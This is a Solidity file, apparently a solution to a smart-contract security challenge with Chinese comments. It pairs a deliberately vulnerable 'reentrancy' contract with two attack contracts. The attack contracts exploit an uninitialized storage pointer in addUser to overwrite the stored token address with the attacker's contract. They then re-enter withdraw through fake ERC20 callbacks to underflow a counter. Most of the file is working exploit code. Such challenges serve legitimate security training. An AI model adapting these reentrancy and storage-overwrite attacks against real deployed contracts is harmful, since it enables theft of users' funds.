
//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.6.0;
// 1.改变token地址.2.times归零
interface IERC20like{
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external  returns (uint256);
}

contract att {
    reentrancy reen;
    bool flag;
    constructor(address addr)public {
        reen = reentrancy(addr);
    }
    function attract(bytes32 gauss) public {
        reen.addUser(gauss,bytes32(uint256(uint160(address(this)))));
        
    }
    function transfer(address recipient, uint256 amount) external returns (bool){ 
        if(!flag){ 
            flag = true; 
            reen.withdraw(1); 
        } 
    } 
    function approve(address spender, uint256 amount) external returns (bool){ 
    } 
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool){ 
        reen.withdraw(1); //可以在这个函数实现重复调用也可以在下面的函数中调用
    } 
    function balanceOf(address account) external returns (uint256){ 
        // reen.withdraw(1); 
        return 1 ether; 
    } 
    function complete() public{ 
        reen.deposit(1); 
        reen.isCompleted(); 
    } 
}

 

contract reentrancy{
    address public  token = 0xd9145CCE52D386f254917e481eB44e9943F39138;//0
    uint256 public score;//1
    uint256 public times =1;//2
    bytes32 private  password;//3
    mapping(address => uint256)public depositTimes;//4
    struct User{
        bytes32 userID;
    }
    User[] public users;//5
    constructor()public{
        password = keccak256(abi.encodePacked(blockhash(block.number-1)));
    }
    function deposit(uint256 amount)public{
        depositTimes[msg.sender]+=1;
        require(IERC20like(token).balanceOf(msg.sender)>amount,"");
        IERC20like(token).transferFrom(msg.sender,address(this),amount);
        times+=1;
    }

    function withdraw(uint256 amount)public{
        require(depositTimes[msg.sender]>0);
        IERC20like(token).transfer(msg.sender,amount);
        depositTimes[msg.sender]-=amount;
        times-=1;
    }

    function addUser(bytes32 guess,bytes32 value)public {
        require(guess == password);
        User storage s;
        s.userID = value;
        users.push(s);
    }

    function isCompleted()public{
        score = 0;
        if (token != 0xd9145CCE52D386f254917e481eB44e9943F39138){
            score+=25;
        }
        if(times==0){
            score+=75;
        }
    }
}
contract attack{ 
    reentrancy che; 
    bool public flag; 
    constructor(address _check)public{ 
        che = reentrancy(_check); 
    } 
    function transfer(address recipient, uint256 amount) external returns (bool){ 
        if(!flag){ 
            flag = true; 
            che.withdraw(1); 
        } 
    } 
    function approve(address spender, uint256 amount) external returns (bool){ 
    } 
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool){ 
    } 
    function balanceOf(address account) external returns (uint256){ 
        che.withdraw(1); 
        return 1 ether; 
    } 
    function complete() public{ 
        che.deposit(1); 
        che.isCompleted(); 
    } 
    function att(bytes32 guess)public{ 
        che.addUser(guess ,bytes32(uint256(uint160(address(this))))); 
    } 
}